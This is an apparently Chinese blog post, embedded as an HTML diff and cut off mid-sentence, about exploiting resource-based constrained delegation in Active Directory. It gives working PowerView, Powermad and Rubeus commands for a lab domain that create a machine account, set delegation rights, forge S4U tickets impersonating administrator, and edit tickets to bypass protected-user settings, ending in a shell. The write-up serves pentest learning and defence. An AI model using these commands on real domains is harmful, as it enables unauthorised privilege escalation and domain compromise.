@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>域渗透——基于资源的约束委派利用 | 七友</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="pentest">
+    <meta name="description" content="前言这篇文章原本是前几天就开始写（水）了，结果我们老师叫我们把2K字的社会实践报告重写一篇，结果拖了两天QAQ。言归正传，前几天看了A-Team的公众号上发了一篇文章《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》以及Elad Shamir大佬的文章，看完之后自己也去搞了一下，踩了一点小坑，下面记录一下。 基于资源的约束委派利用基于资源的约束委派（Resource-b">
+<meta name="keywords" content="pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透——基于资源的约束委派利用">
+<meta property="og:url" content="https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/index.html">
+<meta property="og:site_name" content="七友">
+<meta property="og:description" content="前言这篇文章原本是前几天就开始写（水）了，结果我们老师叫我们把2K字的社会实践报告重写一篇，结果拖了两天QAQ。言归正传，前几天看了A-Team的公众号上发了一篇文章《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》以及Elad Shamir大佬的文章，看完之后自己也去搞了一下，踩了一点小坑，下面记录一下。 基于资源的约束委派利用基于资源的约束委派（Resource-b">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320100834-b3da740c-6a4f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200319154018-e1a4191a-69b4-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200319205236-8227f610-69e0-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320095821-468ffabc-6a4e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320140401-988a0958-6a70-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322100305-44a6e80c-6be1-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321204510-cd4e2b04-6b71-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321192205-31cb65c6-6b66-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320005014-b4d0a9a6-6a01-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320095131-525c757e-6a4d-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320003031-f331e262-69fe-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320002305-e9cb0f06-69fd-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320171713-95993708-6a8b-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320171756-af4b6540-6a8b-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320172207-451a48a2-6a8c-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321131901-795cde70-6b33-1.gif">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321125933-c120b716-6b30-1.gif">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320141108-96e73ffc-6a71-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322111521-5d2a4734-6beb-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321210317-54ddaad4-6b74-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321210809-02f5abb2-6b75-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321215312-4e4547a2-6b7b-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322103543-d3f9b1f2-6be5-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321211215-95689f9a-6b75-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321220014-4974fa96-6b7c-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321214747-8c3ce32c-6b7a-1.gif">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200321221956-0a63ac3c-6b7f-1.gif">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322120649-8ded17e6-6bf2-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322121221-537cc45c-6bf3-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322121915-4acf27b8-6bf4-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322122903-a93703b0-6bf5-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200322170851-bf5fe892-6c1c-1.gif">
+<meta property="og:updated_time" content="2020-03-23T02:04:39.468Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域渗透——基于资源的约束委派利用">
+<meta name="twitter:description" content="前言这篇文章原本是前几天就开始写（水）了，结果我们老师叫我们把2K字的社会实践报告重写一篇，结果拖了两天QAQ。言归正传，前几天看了A-Team的公众号上发了一篇文章《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》以及Elad Shamir大佬的文章，看完之后自己也去搞了一下，踩了一点小坑，下面记录一下。 基于资源的约束委派利用基于资源的约束委派（Resource-b">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320100834-b3da740c-6a4f-1.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname"></h5>
+          <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/byqiyou" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/friends"  >
+                <i class="icon icon-lg icon-friends"></i>
+                Friends
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-about"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">域渗透——基于资源的约束委派利用</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">域渗透——基于资源的约束委派利用</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-03-23T02:04:01.000Z" itemprop="datePublished" class="page-time">
+  2020-03-23
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基于资源的约束委派利用"><span class="post-toc-number">2.</span> <span class="post-toc-text">基于资源的约束委派利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解决敏感用户不可委派的问题"><span class="post-toc-number">3.</span> <span class="post-toc-text">解决敏感用户不可委派的问题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用基于资源的约束委派进行域权限维持"><span class="post-toc-number">4.</span> <span class="post-toc-text">利用基于资源的约束委派进行域权限维持</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#End"><span class="post-toc-number">5.</span> <span class="post-toc-text">End</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">6.</span> <span class="post-toc-text">Reference</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-域渗透——基于资源的约束委派利用"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">域渗透——基于资源的约束委派利用</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-03-23 10:04:01" datetime="2020-03-23T02:04:01.000Z"  itemprop="datePublished">2020-03-23</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章原本是前几天就开始写（水）了，结果我们老师叫我们把2K字的社会实践报告重写一篇，结果拖了两天QAQ。言归正传，前几天看了A-Team的公众号上发了一篇文章《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》以及<code>Elad Shamir</code>大佬的文章，看完之后自己也去搞了一下，踩了一点小坑，下面记录一下。</p>
+<h2 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h2><p>基于资源的约束委派（Resource-based constrained delegation），它除了不再需要域管理员权限去设置相关属性之外，请求ST的过程是和传统的约束委派大同小异，原理我之前也在<a href="https://xz.aliyun.com/t/7217#toc-9" target="_blank" rel="noopener">这篇文章</a>说过了，所以关于原理这部分我这里就不多赘述了，不过还要注意一点就是传统的约束S4U2Self返回的票据一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据总是可转发。如果还想更深入了解的话可以看<code>Elad Shamir</code>的这篇文章<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noopener">《Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory》</a>，这篇文章可以说是总结得非常全</p>
+<p>利用条件：简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击</p>
+<p>利用环境：</p>
+<ul>
+<li>域：test.local</li>
+<li>域控为：dm2012.test.local，Windows Server 2012R2</li>
+<li>目标主机：dm2008.test.local，windows Server 2008R2</li>
+<li>用户：qiyou，对dm2008.test.local主机具有写权限</li>
+<li>其它域内主机：win10</li>
+</ul>
+<p>验证qiyou这个用户对dm2008是否具有写权限，可以使用PowerView枚举<code>DM2008.test.local</code>的中的特定ACE</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity qiyou -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity DM2008  | ?{$_.SecurityIdentifier -match "S-1-5-21-662417213-3583657854-423750704-1001"}</span><br></pre></td></tr></tbody></table></figure>
+<p>可以看到qiyou这个用户对dm2008这个计算机账户拥有完全控制权限（GenericAll），其实也不一定需要<code>GenericAll</code>权限，<code>GenericWrite</code>、<code>WriteProperty</code>、<code>WriteDacl</code>等等权限都是可以修改账户属性的。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320100834-b3da740c-6a4f-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我们现在还需要的是一个具有SPN的账户，因为<code>S4U2Self</code>只适用于具有SPN的账户，恰好的是在域中有一个属性<code>MachineAccountQuota</code>，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN的，所以这里刚好符合我们的意图。</p>
+<p>我们可以使用<code>Kevin Robertson</code>的<code>Powermad</code>中的<code>New-MachineAccount</code>来创建一个用户名为<code>evilsystem</code>，密码为<code>evil</code>的计算机账户</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString "evil" -AsPlainText -Force)</span><br></pre></td></tr></tbody></table></figure>
+<p>可以看到成功创建一个计算机用户<code>evilsystem</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200319154018-e1a4191a-69b4-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>下面是修改DM2008的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值，有两种方法可以修改，<code>Powerview</code>或者<code>ActiveDirectory</code>模块</p>
+<p>配置evilsystem到DM2008的基于资源约束的委派</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)"</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer DM2008| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200319205236-8227f610-69e0-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>还要注意一点的就是，<code>msds-allowedtoactonbehalfofotheridentity</code>属性的值是表示安全描述符的字节数组，所以是不能直接使用字符串型，否则会出现约束冲突的情况。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320095821-468ffabc-6a4e-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>验证是否成功添加</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DM2008 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320140401-988a0958-6a70-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DM2008 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322100305-44a6e80c-6be1-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>通过<code>ActiveDirectory</code>模块添加：</p>
+<blockquote>
+<p>只有Windows Server 2012以及以上的<code>ActiveDirectory</code>模块才有-PrincipalsAllowedToDelegateToAccount选项</p>
+</blockquote>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADComputer DM2008 -PrincipalsAllowedToDelegateToAccount evilsystem$</span><br><span class="line">Get-ADComputer DM2008 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321204510-cd4e2b04-6b71-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p><code>ActiveDirectory</code>模块默认只在域控上安装，如果不是域控可以从域控上把DLL文件复制出来，然后导入即可</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321192205-31cb65c6-6b66-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>配置完<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性之后就可以通过基于资源的约束委派去攻击目标主机了</p>
+<p>现在是无法访问dm2008的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320005014-b4d0a9a6-6a01-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>因为Rubeus是不支持明文的，所以先把它转换为hash</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320095131-525c757e-6a4d-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后用<code>evilsystem$</code>的hash请求白银票据并导入到当前会话中</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320003031-f331e262-69fe-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>导入之后尝试访问dm2008</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320002305-e9cb0f06-69fd-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>但是Rubeus申请的票据和impacket申请的缓存票据貌似还是有一丝的差别，这里用Psexec返回一个shell启动服务失败</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320171713-95993708-6a8b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>因为PsExec是通过服务和命名管道来返回一个shell的，所以这里尝试直接创建一个服务，发现是没有权限创建服务的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320171756-af4b6540-6a8b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>但是我额外申请了一个HOST票据之后，就正常了。。。。。</p>
+<p><strong>注：</strong> 但是如果你只是申请HOST票据，而没有申请CIFS票据的也是不能正常返回一个shell的，原因不明</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<p>将该票据导入之后就可以成功返回shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320172207-451a48a2-6a8c-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>整个过程如下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321131901-795cde70-6b33-1.gif" alt="gif" title="">
+                </div>
+                <div class="image-caption">gif</div>
+            </figure>
+<p>但是如果你是使用impacket套件请求的缓存票据的话，直接CIFS服务就可以了，排除是PsExec的问题这里使用了impacket套件的psexec.py和微软的Psexec.exe做对比</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321125933-c120b716-6b30-1.gif" alt="gif" title="">
+                </div>
+                <div class="image-caption">gif</div>
+            </figure>
+<p>所以总的来说，如果你是用Rubeus你就得申请两个服务票据：HOST和CIFS，如果是用impacket套件的话就申请个CIFS就可以了。</p>
+<p>至于具体原因暂时还不清楚，抓包也没有看出啥原因，这里先留一个坑，有时间再去研究一下。。。</p>
+<h2 id="解决敏感用户不可委派的问题"><a href="#解决敏感用户不可委派的问题" class="headerlink" title="解决敏感用户不可委派的问题"></a>解决敏感用户不可委派的问题</h2><p>利用条件：知道目标的主机账户的凭证</p>
+<p><strong>注：</strong> 一般情况下主机在加入域中会随机设置主机账户的密码，所以一般情况下用的是主机账户hash，并且你是不能修改主机账户的密码，否则该主机就会和域失去信任。</p>
+<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
+<p>下面我们把administrator设置成不可委派以及加入受保护组，如图</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320141108-96e73ffc-6a71-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>可以看到administrator是不可委派并且是受保护组的成员</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322111521-5d2a4734-6beb-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p><strong>注：</strong> 我看<code>Elad Shamir</code>的文章里面说需要设置目标自身的委派，但是我在实现的过程中发现不设置也是可行的。</p>
+<p>这时候我们在通过s4u去申请一下票据，这个时候<code>S4U2self</code>是成功的，但是<code>S4U2proxy</code>是失败的</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dm2008$ /rc4:b5cffac3d2bb5d5a7ded8ff2a70c29dc /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321210317-54ddaad4-6b74-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>也就是说账户不可委派以及受保护组的成员是不影响S4U2Self的，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，可以看到该票据是没有服务名称的，并且不可转发</p>
+<p><strong>注：</strong> 如果该账户设置了<code>TrustedToAuthForDelegation</code>为True，则S4U2Self生成的票据是可转发的，默认为False。详情看<code>Elad Shamir</code>文章的这一节：<code>A Misunderstood Feature #1</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321210809-02f5abb2-6b75-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>因为是服务名称缺失，所以用ASN.1 Editor将票据修改一下即可，具体参考这两篇文章：<a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more" target="_blank" rel="noopener">链接1</a>、<a href="https://docs.microsoft.com/en-gb/windows/security/threat-protection/security-policy-settings/microsoft-network-server-server-spn-target-name-validation-level" target="_blank" rel="noopener">链接2</a></p>
+<p>把SPN添加上即可</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321215312-4e4547a2-6b7b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322103543-d3f9b1f2-6be5-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>修改之后将其导入即可</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321211215-95689f9a-6b75-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>HOST票据同理改一下即可，改了之后导入即可得到一个shell，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321220014-4974fa96-6b7c-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>整个过程如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321214747-8c3ce32c-6b7a-1.gif" alt="gif" title="">
+                </div>
+                <div class="image-caption">gif</div>
+            </figure>
+<p>修改票据的过程貌似有点繁琐是吧，<code>harmj0y</code>之前就考虑了这一点，所以在Rebeus加入了一个模块可以直接修改票据的SPN，命令如下：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></tbody></table></figure>
+<p>我们上面的过程可以直接省略为：</p>
